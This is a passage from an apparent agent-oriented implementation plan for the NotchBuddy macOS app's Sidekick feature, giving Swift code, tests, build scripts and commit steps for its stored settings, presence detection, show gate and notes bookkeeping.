    /// Unmute in Settings: that kind goes back to 0.
    func unmuted(_ kind: String) -> SidekickSettings {
        var s = self
        if Self.kinds.contains(kind) { s.dismissals[kind] = 0 }
        return s
    }

    func withOn(_ on: Bool) -> SidekickSettings { var s = self; s.on = on; return s }
    func withLocal(_ local: Bool) -> SidekickSettings { var s = self; s.local = local; return s }

    // MARK: UserDefaults

    enum Key {
        static let on = "sidekick.on", local = "sidekick.local", dismissals = "sidekick.dismissals"
    }

    /// What is stored, cleaned. Only the keys that are there are read, each as the object it is. The dismissals are stored as JSON text; text that is not JSON is no dismissals.
    static func load(from store: any CatSettingsBacking) -> SidekickSettings {
        var raw: [String: Any] = [:]
        if let v = store.object(forKey: Key.on) { raw["on"] = v }
        if let v = store.object(forKey: Key.local) { raw["local"] = v }
        if let text = store.object(forKey: Key.dismissals) as? String, let data = text.data(using: .utf8), let obj = try? JSONSerialization.jsonObject(with: data) { raw["dismissals"] = obj }
        return clean(raw)
    }

    /// The counts as they are stored: the JSON text of kind to count, keys in order, so the same counts are always the same text.
    var dismissalsText: String {
        guard let data = try? JSONSerialization.data(withJSONObject: dismissals, options: [.sortedKeys]) else { return "{}" }
        return String(decoding: data, as: UTF8.self)
    }

    /// Writes what differs from `old` (everything, when there is no `old`). Only a cleaned value is ever passed in.
    func save(to store: any CatSettingsBacking, replacing old: SidekickSettings? = nil) {
        if old?.on != on { store.set(on, forKey: Key.on) }
        if old?.local != local { store.set(local, forKey: Key.local) }
        if old?.dismissals != dismissals { store.set(dismissalsText, forKey: Key.dismissals) }
    }
}
```

**Create `NotchBuddy/Sources/App/SidekickStore.swift`**

```swift
import Combine
import Foundation

// The app's sidekick settings: loaded from the store (UserDefaults in the app) when the app starts and saved on every change. Every value goes through `SidekickSettings.clean` on the way in,
// so nothing that did not is stored or used. The pure part (the clean-up, the keys, load and save, the dismissal rules) is `SidekickSettings`; this is the app's single holder of the result.
// Tests build their own store on a dictionary and never touch `UserDefaults.standard`.

@MainActor
final class SidekickStore: ObservableObject {
    /// The app's settings, on `UserDefaults.standard`.
    static let shared = SidekickStore()

    @Published private(set) var settings: SidekickSettings
    private let backing: any CatSettingsBacking

    init(backing: any CatSettingsBacking = UserDefaults.standard) {
        self.backing = backing
        settings = SidekickSettings.load(from: backing)
    }

    /// Changes the settings. The closure edits a copy; the copy is cleaned, and when it differs from what is held it is published and saved (only the keys that changed).
    func update(_ change: (inout SidekickSettings) -> Void) {
        var next = settings
        change(&next)
        next = SidekickSettings.clean(next.json)
        guard next != settings else { return }
        next.save(to: backing, replacing: settings)
        settings = next
    }

    /// "Recaps and nudges". Off means no recap and no stuck nudge; the permission line and the risk badge have no switch.
    func setOn(_ on: Bool) { update { $0 = $0.withOn(on) } }
    /// "Nicer wording from a local model". Off means only the templates.
    func setLocal(_ local: Bool) { update { $0 = $0.withLocal(local) } }
    /// A click on Not now, OK or ×.
    func dismiss(_ kind: String) { update { $0 = $0.dismissed(kind) } }
    /// Settings → Sidekick → Unmute.
    func unmute(_ kind: String) { update { $0 = $0.unmuted(kind) } }
}
```

- [ ] **Step 4: Run the test to make it pass**

Run: `bash scripts/test-sidekick-settings.sh`
Expected: PASS. `dismiss, unmute and muted: 9 cases`, `SidekickSettings.clean: 17 stored values`, 21 `✓` lines in all, then `All tests passed.`

Bite it once: `sed -i '' 's/static let muteAt = 2/static let muteAt = 3/' NotchBuddy/Sources/App/SidekickSettings.swift && bash scripts/test-sidekick-settings.sh 2>&1 | grep -E "✗|failed"`. Expected: several `✗` lines (the frozen kinds, the steps, the clean values) and `N test(s) failed.`. Undo it with `sed -i '' 's/static let muteAt = 3/static let muteAt = 2/' NotchBuddy/Sources/App/SidekickSettings.swift` and run the test again.

- [ ] **Step 5: Commit**

```bash
cd NotchBuddy && xcodegen > /dev/null && cd ..
```

```bash
git rev-parse --show-toplevel && git branch --show-current   # the worktree's folder and f1/mac-sidekick: stop if either is wrong
MSG="$(mktemp "${TMPDIR:-/tmp}/f1-mac-msg.XXXXXX")"
cat > "$MSG" <<'EOF'
feat(sidekick): dismissals, the stored settings and the store, from dismiss-cases.json and settings-cases.json

Two dismissals mute a kind and Unmute brings it back; the switches and the counts are cleaned on the way in and saved only when they change (sidekick.on, sidekick.local, sidekick.dismissals).

Co-Authored-By: Claude Haiku 5.5 <noreply@anthropic.com>
EOF
git add NotchBuddy/Sources/App/SidekickSettings.swift NotchBuddy/Sources/App/SidekickStore.swift tests/SidekickSettingsTests.swift scripts/test-sidekick-settings.sh NotchBuddy/NotchBuddy.xcodeproj/project.pbxproj
git commit -F "$MSG"
```

---

### Task 6: Presence, the Mac's notifications as flags, the idle sample and the show gate

**Agent:** `nm-implementer-light` (Haiku 5.5, medium).

**Files:**
- Create: `NotchBuddy/Sources/App/SidekickPresence.swift`, `tests/SidekickPresenceTests.swift`, `scripts/test-sidekick-presence.sh`

**Interfaces:**
- Consumes: Task 5's `SidekickSettings` (`kinds`, `muteAt`, `cleanDismissals`, `zeros`), Task 1's `SK.minute`; F1-0's `presenceStep` and `shouldShow` and `tests/fixtures/sidekick/presence-cases.json` (keys `idle`, `cases` with `start` and `steps` of `{at, signal, state, back}`) and `show-cases.json` (keys `holdMs`, `noteGapMs`, `cases` with `input` and `show`).
- Produces: `SKPresence` (`reasons`, `awaySince`, `wasAway`, `isAway`), `SKSignal` (`lock`, `unlock`, `sleep`, `wake`, `displayOff`, `displayOn`, `idle(seconds:)`), `SKBack` (`awaySince`, `awayMs`), `SidekickPresence` (`order`, `awaySeconds`, `backSeconds`, `step(_:_:now:)`), `SKPresenceFlags` (`Source`, `Event`, `set(_:_:)`, `locked`, `displayOff`, `asleep`; `Event.signal`), `SidekickIdle` (`normalMs`, `awayMs`, `sampleDue(now:last:liveSessions:idleAway:)`), `SKShowInput` (and its `Visible`), `SKShowDecision` and `SidekickGate` (`holdMs`, `noteGapMs`, `hold(for:)`, `shouldShow(_:)`). Tasks 7, 9 and 12 read them.

The user is **away** while any reason holds (`lock`, `sleep`, `display`, or `idle` after 300 s without input) and **back** when the last one lets go; `back` is told once, with when the away began. `SKPresenceFlags` is what the Mac's notifications become before they reach the rule: it turns them into events only when the answer **changes**, so a lock that arrives as two notifications (the screen lock and the session switch) is one lock, and one of them letting go does not unlock while the other still holds (Task 12's `PresenceMonitor` feeds it). `SidekickIdle.sampleDue` is the rule that keeps the idle time from being a poll: it is read only while an agent has a live session, at most every 5 s (every second while the user is away by idle, so a return is noticed at once), and only on a tick the island already has. `SidekickGate.shouldShow` says whether a note may show now, with the reason when it may not (`off`, `kind`, `muted`, `away`, `ratelimit`, `card`, `typing`, `busy`, `recent`, `nudged`, `recapGiven`, in that order) and whether a recap replaces a nudge nobody has seen.

- [ ] **Step 1: Write the failing test**

The program checks the thresholds against the fixture's, replays the 19 presence cases and the 43 gate cases, and adds what it cannot write (a time that is not finite, a signal nobody knows, a whole night as one `back` from the first lock, the flags, the idle sample's rule).

**Create `tests/SidekickPresenceTests.swift`**

```swift
import Foundation

// The presence rule and the show gate against tests/fixtures/sidekick/presence-cases.json and show-cases.json, and what the fixture cannot write (a time that is not finite, a signal
// nobody knows). Run through scripts/test-sidekick-presence.sh.

@main
enum SidekickPresenceTests {
    typealias P = SidekickPresence
    static func rows(_ x: Any?) -> [[String: Any]] { x as! [[String: Any]] }
    static func number(_ v: Any?) -> Double? { guard let n = v as? NSNumber, CFGetTypeID(n) != CFBooleanGetTypeID() else { return nil }; return n.doubleValue }

    /// The fixture's signal, or nil when it is not one the app has (not an object, an unknown type, an idle with no number of seconds).
    static func signal(_ raw: Any?) -> SKSignal? {
        guard let o = raw as? [String: Any], let type = o["type"] as? String else { return nil }
        switch type {
        case "lock": return .lock
        case "unlock": return .unlock
        case "sleep": return .sleep
        case "wake": return .wake
        case "displayOff": return .displayOff
        case "displayOn": return .displayOn
        case "idle": return number(o["seconds"]).map { .idle(seconds: $0) }
        default: return nil
        }
    }

    static func state(_ raw: Any?) -> SKPresence {
        let o = raw as? [String: Any] ?? [:]
        return SKPresence(reasons: (o["reasons"] as? [Any] ?? []).compactMap { $0 as? String }.filter(P.order.contains), awaySince: number(o["awaySince"]), wasAway: false)
    }

    static func json(_ s: SKPresence) -> [String: Any] { ["reasons": s.reasons, "awaySince": s.awaySince as Any? ?? NSNull(), "wasAway": s.wasAway] }

    static func showInput(_ raw: Any?) -> SKShowInput {
        let o = raw as? [String: Any] ?? [:]
        var i = SKShowInput()
        i.on = (o["on"] as? Bool) != false
        i.kind = o["kind"] as? String ?? ""
        i.dismissals = SidekickSettings.cleanDismissals(o["dismissals"])
        i.away = (o["away"] as? Bool) == true
        i.ratelimit = (o["ratelimit"] as? Bool) == true
        i.card = o["card"] as? String
        i.ownCard = (o["ownCard"] as? Bool) == true
        i.inputFocused = (o["inputFocused"] as? Bool) == true
        if let v = o["visible"] as? [String: Any] { i.visible = SKShowInput.Visible(kind: v["kind"] as? String, seen: (v["seen"] as? Bool) == true) }
        i.lastShownAt = number(o["lastShownAt"])
        i.now = number(o["now"])
        i.nudged = (o["nudged"] as? Bool) == true
        i.recapGiven = (o["recapGiven"] as? Bool) == true
        return i
    }

    @MainActor static func main() {
        let px = CT.fixture("presence-cases.json", dir: "sidekick"), sx = CT.fixture("show-cases.json", dir: "sidekick")

        CT.section("the thresholds")
        let idle = px["idle"] as! [String: Any]
        CT.check("300 s without input is away, under 3 s is back", [P.awaySeconds, P.backSeconds], [number(idle["AWAY_S"])!, number(idle["BACK_S"])!])
        CT.check("a nudge is held 30 s, a recap 2 minutes, and notes are 60 s apart", [SidekickGate.holdMs["nudge"]!, SidekickGate.holdMs["recap"]!, SidekickGate.noteGapMs], [30000, 120000, 60000] as [Double])
        let hold = sx["holdMs"] as! [String: Any]
        CT.check("the same numbers as the fixture", [number(hold["nudge"])!, number(hold["recap"])!, number(sx["noteGapMs"])!], [30000, 120000, 60000] as [Double])

        let cases = rows(px["cases"])
        CT.section("presenceStep: \(cases.count) cases, the state and the back after every signal")
        var diffs: [String] = []
        for c in cases {
            var s = state(c["start"])
            for (i, st) in rows(c["steps"]).enumerated() {
                let now = number(st["at"]) ?? .nan
                let r = P.step(s, signal(st["signal"]), now: now)
                s = r.state
                var d = CT.diffs(json(s), st["state"]!)
                let back: Any = r.back.map { ["back": true, "awaySince": $0.awaySince, "awayMs": $0.awayMs] as [String: Any] } ?? false
                d += CT.diffs(back, st["back"]!)
                if !d.isEmpty { diffs.append("\(c["name"] as! String) step \(i): \(d.first!)") }
            }
        }
        CT.checkRows("every step is the fixture's", diffs)

        let shows = rows(sx["cases"])
        CT.section("shouldShow: \(shows.count) cases, show, reason and replace each")
        diffs = []
        for c in shows {
            let got = SidekickGate.shouldShow(showInput(c["input"]))
            let d = CT.diffs(got.json, c["show"]!)
            if !d.isEmpty { diffs.append("\(c["name"] as! String): \(d.first!)") }
        }
        CT.checkRows("every decision is the fixture's", diffs)

        CT.section("what the fixture cannot write")
        let r1 = P.step(SKPresence(), .lock, now: .nan)
        CT.check("a time that is not finite changes nothing", r1.state, SKPresence())
        CT.check("an idle sample that is not finite changes nothing", P.step(SKPresence(), .idle(seconds: .nan), now: 5).state, SKPresence())
        CT.check("a signal nobody knows (nil) changes nothing", P.step(SKPresence(reasons: ["lock"], awaySince: 5), nil, now: 9).state, SKPresence(reasons: ["lock"], awaySince: 5, wasAway: true))
        let night = [SKSignal.lock, .displayOff, .sleep, .wake, .displayOn, .unlock]
        var s = SKPresence(), back: SKBack?
        for (i, sig) in night.enumerated() { let r = P.step(s, sig, now: Double(1000 + i * 1000)); s = r.state; back = r.back ?? back }
        CT.check("a whole night is one back, told once, from the first lock", back, SKBack(awaySince: 1000, awayMs: 5000))

        CT.section("the Mac's notifications become events only when something changes")
        var f = SKPresenceFlags()
        CT.check("a screen lock is a lock", f.set(.screenLock, true), .lock)
        CT.check("the session switch that comes with it is not another lock", f.set(.session, true), nil)
        CT.check("one of them letting go does not unlock while the other holds", f.set(.screenLock, false), nil)
        CT.check("the last one unlocks", f.set(.session, false), .unlock)
        CT.check("an unlock again is nothing", f.set(.session, false), nil)
        CT.check("the displays sleep and wake", [f.set(.display, true), f.set(.display, true), f.set(.display, false)], [.displayOff, nil, .displayOn])
        CT.check("the Mac sleeps and wakes", [f.set(.system, true), f.set(.system, false), f.set(.system, false)], [.sleep, .wake, nil])
        CT.check("each event is the presence rule's signal", [SKPresenceFlags.Event.lock, .unlock, .displayOff, .displayOn, .sleep, .wake].map(\.signal), [.lock, .unlock, .displayOff, .displayOn, .sleep, .wake])
        CT.check("the flags tell what holds now", { var g = SKPresenceFlags(); _ = g.set(.session, true); _ = g.set(.display, true); return [g.locked, g.displayOff, g.asleep] }(), [true, true, false])

        CT.section("the idle sample: on a tick that already exists, and only while an agent has a live session")
        typealias I = SidekickIdle
        CT.check("no live session: never asked", I.sampleDue(now: 100_000, last: nil, liveSessions: false, idleAway: false), false)
        CT.check("the first sample is due at once", I.sampleDue(now: 100_000, last: nil, liveSessions: true, idleAway: false), true)
        CT.check("not again under 5 s", I.sampleDue(now: 104_999, last: 100_000, liveSessions: true, idleAway: false), false)
        CT.check("5 s later", I.sampleDue(now: 105_000, last: 100_000, liveSessions: true, idleAway: false), true)
        CT.check("while the user is away by idle it is every second", [I.sampleDue(now: 100_999, last: 100_000, liveSessions: true, idleAway: true), I.sampleDue(now: 101_000, last: 100_000, liveSessions: true, idleAway: true)], [false, true])
        CT.check("a clock that went backwards samples again", I.sampleDue(now: 50_000, last: 100_000, liveSessions: true, idleAway: false), true)
        CT.check("a time that is not finite is never due", [I.sampleDue(now: .nan, last: nil, liveSessions: true, idleAway: false), I.sampleDue(now: 5, last: .nan, liveSessions: false, idleAway: false)], [false, false])
        CT.finish()
    }
}
```

**Create `scripts/test-sidekick-presence.sh`**

```bash
#!/usr/bin/env bash
# Sidekick presence rule and show gate (presenceStep, shouldShow): presence-cases.json and show-cases.json, and what they cannot write. Pure Foundation.
set -euo pipefail
cd "$(dirname "$0")/.."
TEST_DIR="$(mktemp -d "${TMPDIR:-/tmp}/notchmeow-sidekick-presence.XXXXXX")"
trap 'rm -rf "$TEST_DIR"' EXIT
export NM_LOG_DIR="$TEST_DIR/logs"   # tests never write to ~/Library/Logs

APP=NotchBuddy/Sources/App
swiftc -swift-version 6 \
    $APP/CatMath.swift $APP/CatPresets.swift $APP/CatGeometry.swift $APP/Personality.swift $APP/CatRules.swift $APP/CatSettings.swift $APP/SidekickText.swift $APP/SidekickSettings.swift $APP/SidekickPresence.swift \
    tests/CatTestSupport.swift tests/SidekickPresenceTests.swift \
    -o "$TEST_DIR/sidekick-presence-tests"
"$TEST_DIR/sidekick-presence-tests"
```

Then make it executable: `chmod +x scripts/test-sidekick-presence.sh`

- [ ] **Step 2: Run the test to make it fail**

Run: `bash scripts/test-sidekick-presence.sh`
Expected: FAIL. `error opening input file` for `SidekickPresence.swift`.

- [ ] **Step 3: Write the rules**

**Create `NotchBuddy/Sources/App/SidekickPresence.swift`**

```swift
import Foundation

// Is the user at the computer, and may a note show now. Port of `presenceStep` and `shouldShow` in `shared/sidekick-core.js` (the tie-breaker); tests/fixtures/sidekick/presence-cases.json and
// show-cases.json pin them and docs/SIDEKICK-CONTRACT.md explains them. The user is AWAY while any reason holds (the screen is locked, the Mac sleeps, the display is off, or 300 s without
// input), and BACK when the last reason lets go. Both rules are given every time they need and read no clock. Pure Foundation.

struct SKPresence: Equatable, Sendable {
    /// The reasons that hold now, in the frozen order: lock, sleep, display, idle.
    var reasons: [String] = []
    var awaySince: Double? = nil
    var wasAway = false
    var isAway: Bool { !reasons.isEmpty }
}

enum SKSignal: Equatable, Sendable {
    case lock, unlock, sleep, wake, displayOff, displayOn
    /// The OS's seconds since the last input.
    case idle(seconds: Double)
}

struct SKBack: Equatable, Sendable {
    var awaySince: Double
    var awayMs: Double
}

enum SidekickPresence {
    static let order = ["lock", "sleep", "display", "idle"]
    /// 300 s without input is away; a sample under 3 s is back. The samples in between change nothing.
    static let awaySeconds = 300.0, backSeconds = 3.0

    /// Whether the user is away, from the signals the OS gives. `signal` nil is a signal nobody knows: it changes nothing. A time that is not finite changes nothing either.
    /// Returns the new state and, once, when the last reason lets go, `back`.
    static func step(_ state: SKPresence, _ signal: SKSignal?, now: Double) -> (state: SKPresence, back: SKBack?) {
        var reasons = Set(state.reasons.filter(order.contains))
        var since = state.awaySince.flatMap { $0.isFinite ? $0 : nil }
        let was = !reasons.isEmpty
        func keep() -> (SKPresence, SKBack?) { (SKPresence(reasons: order.filter(reasons.contains), awaySince: reasons.isEmpty ? nil : since, wasAway: was), nil) }
        guard now.isFinite, let signal else { return keep() }
        var began = now
        var isIdle = false
        switch signal {
        case .lock: reasons.insert("lock")
        case .unlock: reasons.remove("lock")
        case .sleep: reasons.insert("sleep")
        case .wake: reasons.remove("sleep")
        case .displayOff: reasons.insert("display")
        case .displayOn: reasons.remove("display")
        case .idle(let seconds):
            guard seconds.isFinite else { return keep() }
            isIdle = true
            if seconds >= awaySeconds { reasons.insert("idle"); began = now - seconds * 1000 }
            else if seconds >= 0 && seconds < backSeconds { reasons.remove("idle") }
        }
        let isAway = !reasons.isEmpty
        if isAway { since = !was || since == nil ? began : (isIdle && reasons.contains("idle") ? min(since!, began) : since) }
        if was && !isAway {
            let start = since ?? now
            return (SKPresence(reasons: [], awaySince: nil, wasAway: true), SKBack(awaySince: start, awayMs: now - start))
        }
        return (SKPresence(reasons: order.filter(reasons.contains), awaySince: isAway ? since : nil, wasAway: was), nil)
    }
}

/// What the Mac's own notifications say, kept as flags and turned into events only when something CHANGES, so two notifications for one lock (the screen lock and the session switch) are one
/// lock, and one of them letting go does not unlock while the other still holds. `PresenceMonitor` (the app's side) feeds it; the desktop cat and the sidekick both read the events.
struct SKPresenceFlags: Equatable, Sendable {
    enum Source: Sendable { case screenLock, session, display, system }
    enum Event: Equatable, Sendable {
        case lock, unlock, displayOff, displayOn, sleep, wake

        var signal: SKSignal {
            switch self {
            case .lock: return .lock
            case .unlock: return .unlock
            case .displayOff: return .displayOff
            case .displayOn: return .displayOn
            case .sleep: return .sleep
            case .wake: return .wake
            }
        }
    }

    private(set) var screenLock = false, session = false, display = false, system = false
    /// The screen is locked, or the session was switched away (fast user switching).
    var locked: Bool { screenLock || session }
    /// The screens are asleep.
    var displayOff: Bool { display }
    /// The Mac is asleep.
    var asleep: Bool { system }

    /// One notification. Returns the event only when the answer changed.
    mutating func set(_ source: Source, _ on: Bool) -> Event? {
        let wasLocked = locked
        switch source {
        case .screenLock: screenLock = on
        case .session: session = on
        case .display:
            guard display != on else { return nil }
            display = on
            return on ? .displayOff : .displayOn
        case .system:
            guard system != on else { return nil }
            system = on
            return on ? .sleep : .wake
        }
        return locked == wasLocked ? nil : (locked ? .lock : .unlock)
    }
}

/// When the OS is asked how long the user has been idle. It is not a poll of its own: the answer is read on a tick the island already has, on a hook event and on an unlock, and only
/// while an agent has a live session (nothing to recap or nudge otherwise). Every 5 s at most, and every 1 s while the user is away by idle, so a return is noticed at once.
enum SidekickIdle {
    static let normalMs = 5000.0, awayMs = 1000.0

    static func sampleDue(now: Double, last: Double?, liveSessions: Bool, idleAway: Bool) -> Bool {
        guard liveSessions, now.isFinite else { return false }
        guard let last, last.isFinite, last <= now else { return true }
        return now - last >= (idleAway ? awayMs : normalMs)
    }
}

struct SKShowInput: Equatable, Sendable {
    /// The Sidekick switch ("Recaps and nudges"): off means nothing shows.
    var on = true
    var kind = ""
    var dismissals: [String: Int] = SidekickSettings.zeros
    var away = false
    var ratelimit = false
    /// "approval" or "question": a card is in front of the island.
    var card: String? = nil
    /// The waiting nudge's own card is on screen.
    var ownCard = false
    var inputFocused = false
    /// The note on screen now: its kind, and whether the user has seen it.
    var visible: Visible? = nil
    var lastShownAt: Double? = nil
    var now: Double? = nil
    var nudged = false
    var recapGiven = false

    struct Visible: Equatable, Sendable { var kind: String?; var seen: Bool }
}

struct SKShowDecision: Equatable, Sendable {
    var show: Bool
    /// "ok", or the first thing that says no: off, kind, muted, away, ratelimit, card, typing, busy, recent, nudged, recapGiven.
    var reason: String
    /// The note shown replaces a nudge nobody has seen.
    var replace: Bool
    var json: [String: Any] { ["show": show, "reason": reason, "replace": replace] }
}

enum SidekickGate {
    static let holdMs: [String: Double] = ["nudge": 30000, "recap": 2 * SK.minute]
    static let noteGapMs = 60000.0

    /// How long a refused note is kept, waiting for the gate to open: 30 s for a nudge, 2 minutes for a recap.
    static func hold(for kind: String) -> Double { kind == "recap" ? holdMs["recap"]! : holdMs["nudge"]! }

    /// Whether a note (a recap or a nudge) may show now. The reasons are tried in this order: off, kind, muted, away (a recap waits for the return, and so does a nudge), ratelimit (a stuck nudge
    /// only), card (an approval or a question is in front; for the waiting nudge its own card must not be on screen), typing, busy (another note is visible, unless it is a nudge nobody has seen and
    /// this is the recap, which replaces it), recent (a note showed in the last 60 s; the recap goes first), nudged, recapGiven.
    static func shouldShow(_ i: SKShowInput) -> SKShowDecision {
        func no(_ reason: String) -> SKShowDecision { SKShowDecision(show: false, reason: reason, replace: false) }
        if !i.on { return no("off") }
        if !SidekickSettings.kinds.contains(i.kind) { return no("kind") }
        if SidekickSettings.cleanDismissals(i.dismissals)[i.kind, default: 0] >= SidekickSettings.muteAt { return no("muted") }
        let recap = i.kind == "recap"
        if i.away { return no("away") }
        if !recap && i.ratelimit { return no("ratelimit") }
        if i.kind == "stuck.waiting" ? i.ownCard : (i.card == "approval" || i.card == "question") { return no("card") }
        if i.inputFocused { return no("typing") }
        var replace = false
        if let v = i.visible {
            if recap, let k = v.kind, k != "recap", !v.seen { replace = true } else { return no("busy") }
        }
        if !recap, let last = i.lastShownAt, let now = i.now, last.isFinite, now.isFinite, now - last < noteGapMs { return no("recent") }
        if !recap && i.nudged { return no("nudged") }
        if recap && i.recapGiven { return no("recapGiven") }
        return SKShowDecision(show: true, reason: "ok", replace: replace)
    }
}
```

- [ ] **Step 4: Run the test to make it pass**

Run: `bash scripts/test-sidekick-presence.sh`
Expected: PASS. `presenceStep: 19 cases`, `shouldShow: 43 cases`, 25 `✓` lines in all, then `All tests passed.`

Bite it once: `sed -i '' 's/static let awaySeconds = 300.0/static let awaySeconds = 200.0/' NotchBuddy/Sources/App/SidekickPresence.swift && bash scripts/test-sidekick-presence.sh 2>&1 | grep -E "✗|failed"`. Expected: `✗ 300 s without input is away, under 3 s is back`, `✗ every step is the fixture's` and `2 test(s) failed.` Undo it with the reverse `sed` and run the test again.

- [ ] **Step 5: Commit**

```bash
git rev-parse --show-toplevel && git branch --show-current   # the worktree's folder and f1/mac-sidekick: stop if either is wrong
MSG="$(mktemp "${TMPDIR:-/tmp}/f1-mac-msg.XXXXXX")"
cat > "$MSG" <<'EOF'
feat(sidekick): presence, the show gate and the idle sample's rule, from presence-cases.json and show-cases.json

Away and back from the Mac's signals, the notifications as flags that change only on a change, the idle sample at most every 5 s while an agent is live, and the gate every note goes through.

Co-Authored-By: Claude Haiku 5.5 <noreply@anthropic.com>
EOF
git add NotchBuddy/Sources/App/SidekickPresence.swift tests/SidekickPresenceTests.swift scripts/test-sidekick-presence.sh
git commit -F "$MSG"
```

---

### Task 7: The notes and the one clock

**Agent:** `nm-implementer-light` (Haiku 5.5, medium).

**Files:**
- Create: `NotchBuddy/Sources/App/SidekickNotes.swift`, `tests/SidekickNotesTests.swift`, `scripts/test-sidekick-notes.sh`

**Interfaces:**
- Consumes: Task 6's `SidekickGate` (`hold(for:)`), `SKShowInput.Visible`; Task 4's `SKFacts`.
- Produces: `SKNote` (`id`, `kind`, `text`, `facts`, `key`, `agentId`, `awaySince`, `createdAt`, `isRecap`), `SidekickNotes` (`held`, `showing`, `lastShownAt`, `recapGivenFor`, `showMs(for:)`, `offer(_:now:)`, `dropExpired(now:)`, `queue`, `visible`, `recapGiven(for:)`, `show(_:now:)`, `markSeen()`, `retire()`, `showingExpired(now:)`, `extendShowing(to:)`, `drop(_:)`, `retext(kind:key:text:)`, `nearest(_:_:)`, `nextDeadline`), `SidekickHost` (`views`, `canHost(expanded:view:)`) and `SidekickClock` (`init(now:schedule:)`, `set(_:)`, `deadline`, `scheduled`, `onFire`). Tasks 9 and 10 read them.

A note (a recap or a nudge) that the show gate refuses is **held**, up to 30 s for a nudge and 2 minutes for a recap, and shown if the gate opens; then it is dropped silently. A note that shows stays up 20 s (a nudge) or 45 s (a recap) and then goes without counting as a dismissal. `SidekickNotes` is only that bookkeeping, as plain values. `SidekickHost.canHost` says which views of the open island may host a note: only the ones the user is just looking at (overview, empty, finished, a note, the sidekick's own); never a card, a question, the chat, a mail draft, the drop flow or Settings. `SidekickClock` is the **one one-shot timer of the whole sidekick**, in the pattern of `CatSleepClock`: `set(at)` makes `at` the only deadline (a different one replaces the timer, the same one leaves it alone, `nil` cancels it) and it is never set while nothing runs; it takes its clock and its timer from outside, so a test moves both by hand.

- [ ] **Step 1: Write the failing test**

The program drives the bookkeeping (a nudge held 30 s and dropped, a recap held 2 minutes, a new recap replacing a held one, the same nudge never kept twice, a shown note seen, replaced, retired and extended, a nudge's words changed in place), the hosting rule for all 19 views, and the clock with a hand clock and a hand timer: nothing set, nothing scheduled; one deadline, one timer; the same deadline leaves it alone; another replaces it; it fires once at the deadline and is spent; `set(nil)` cancels; a deadline that is not finite sets nothing.

**Create `tests/SidekickNotesTests.swift`**

```swift
import Foundation

// The notes' bookkeeping (held, shown, dropped, replaced) and the sidekick's one clock, driven by hand: a clock that moves when the test says, a timer that runs when the test says.
// Run through scripts/test-sidekick-notes.sh.

@main
enum SidekickNotesTests {
    /// A clock and a timer by hand: `advance` moves the time and runs what falls due.
    @MainActor final class Hand {
        var t = 0.0
        var timers: [(id: Int, at: Double, fire: @MainActor @Sendable () -> Void)] = []
        var next = 0
        func schedule(_ after: Double, _ fire: @escaping @MainActor @Sendable () -> Void) -> SidekickClock.Cancel {
            next += 1
            let id = next
            timers.append((id, t + after, fire))
            return { [self] in MainActor.assumeIsolated { timers.removeAll { $0.id == id } } }
        }
        func advance(_ ms: Double) {
            t += ms
            while let d = timers.filter({ $0.at <= t }).min(by: { $0.at < $1.at }) { timers.removeAll { $0.id == d.id }; d.fire() }
        }
    }

    static func note(_ id: Int, _ kind: String, key: String? = nil, awaySince: Double? = nil) -> SKNote { SKNote(id: id, kind: kind, text: "t\(id)", key: key, awaySince: awaySince) }

    @MainActor static func main() {
        CT.section("held notes: kept for 30 s (a nudge) or 2 minutes (a recap), then dropped")
        var n = SidekickNotes()
        n.offer(note(1, "stuck.loop", key: "a|1"), now: 1000)
        n.offer(note(2, "recap", awaySince: 5), now: 1000)
        n.offer(note(3, "stuck.loop", key: "a|1"), now: 1500)
        CT.check("the same nudge is not kept twice", n.held.count, 2)
        CT.check("a recap goes first in the queue", n.queue.map(\.id), [2, 1])
        n.offer(note(4, "recap", awaySince: 9), now: 2000)
        CT.check("a new recap replaces the held one", n.queue.map(\.id), [4, 1])
        CT.check("the nearest deadline is the nudge's: 30 s after it was held", n.nextDeadline, 31000)
        CT.check("nothing is dropped early", n.dropExpired(now: 30999).map(\.id), [])
        CT.check("the nudge is dropped at 30 s", n.dropExpired(now: 31000).map(\.id), [1])
        CT.check("the recap is still held at 2 minutes less a moment, and gone at 2 minutes", [n.dropExpired(now: 121999).map(\.id), n.dropExpired(now: 122000).map(\.id)], [[], [4]])
        CT.check("nothing held, nothing on screen: no deadline", n.nextDeadline, nil)

        CT.section("a shown note: seen, replaced, retired, and its time")
        var m = SidekickNotes()
        m.offer(note(1, "stuck.silent", key: "a|1"), now: 0)
        CT.check("it shows", m.show(1, now: 100)?.id, 1)
        CT.check("the gate sees it as not yet seen", m.visible, SKShowInput.Visible(kind: "stuck.silent", seen: false))
        m.markSeen()
        CT.check("and then as seen", m.visible, SKShowInput.Visible(kind: "stuck.silent", seen: true))
        CT.check("a nudge stays 20 s", [m.showingExpired(now: 20099), m.showingExpired(now: 20100)], [false, true])
        CT.check("the deadline is its time", m.nextDeadline, 20100)
        CT.check("it was shown at 100", m.lastShownAt, 100)
        CT.check("the same nudge offered while it is on screen is not kept", { var k = m; k.offer(note(9, "stuck.silent", key: "a|1"), now: 200); return k.held.count }(), 0)
        m.offer(note(2, "recap", awaySince: 77), now: 300)
        CT.check("a recap replaces it", m.show(2, now: 400)?.id, 2)
        CT.check("the recap is the one on screen", m.showing?.note.id, 2)
        CT.check("for 45 s", m.showing?.expiresAt, 45400)
        CT.check("its away period has had its recap, another has not, and none is none", [m.recapGiven(for: 77), m.recapGiven(for: 78), m.recapGiven(for: nil)], [true, false, false])
        CT.check("retire returns the note and clears the screen", [m.retire()?.id, m.showing?.note.id], [2, nil])
        CT.check("retire with nothing on screen is nothing", m.retire()?.id, nil)
        CT.check("a note that is not held does not show", m.show(99, now: 1), nil)

        CT.section("a nudge's words change in place")
        var w = SidekickNotes()
        w.offer(note(1, "stuck.waiting", key: "a|1"), now: 0)
        w.retext(kind: "stuck.waiting", key: "a|1", text: "in the terminal")
        CT.check("a held note", w.held[0].note.text, "in the terminal")
        _ = w.show(1, now: 5)
        w.retext(kind: "stuck.waiting", key: "a|1", text: "again")
        CT.check("a shown note", w.showing?.note.text, "again")
        CT.check("and no second nudge is held", w.held.count, 0)
        CT.check("a note of another session or kind is left alone", { var k = SidekickNotes(); k.offer(note(1, "stuck.waiting", key: "a|1"), now: 0); k.retext(kind: "stuck.waiting", key: "b|2", text: "x"); k.retext(kind: "stuck.loop", key: "a|1", text: "x"); return k.held[0].note.text }(), "t1")

        CT.section("the rows the card shows")
        func recap(_ lines: [String]) -> SKNote { SKNote(id: 1, kind: "recap", text: lines.joined(separator: "\n")) }
